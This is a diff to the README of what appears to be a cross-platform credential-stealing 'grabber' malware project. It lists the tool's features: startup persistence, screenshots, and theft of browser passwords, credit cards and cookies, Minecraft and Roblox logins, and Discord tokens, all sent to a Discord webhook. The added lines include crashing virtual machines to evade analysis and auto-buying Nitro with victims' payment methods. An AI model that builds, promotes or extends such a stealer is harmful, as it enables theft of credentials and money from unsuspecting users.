@@ -6,6 +6,8 @@ I don't found it a name
 
 ## Functionalities
 
+Some of these functionalities are customisable in the [`config.js`](config.js) file.
+
 * Works on both Windows, Linux and macOS
 * Can add itself to startup programs
 * Can get IP info using an API
@@ -15,8 +17,11 @@ I don't found it a name
 * Can take a screenshot of all monitors
 * Can get Chrome-based browsers logins and passwords, credit cards, cookies, top sites, history 
 * Can get Minecraft[*](#minecraft-launchers-that-the-grabber-try-to-get-login-infos) and Roblox login
+* Can trigger a BSOD if the grabber is run from a virtual machine
+* Can get Discord token (killing the Discord client is not needed)
+* Can auto-buy Nitro as soon as the user has launched the grabber (only works if the user have a payment method attached to their Discord account)
 
-All these are sent to a Discord webhook. 
+All that are sent to a Discord webhook. 
 
 ## Notes
 
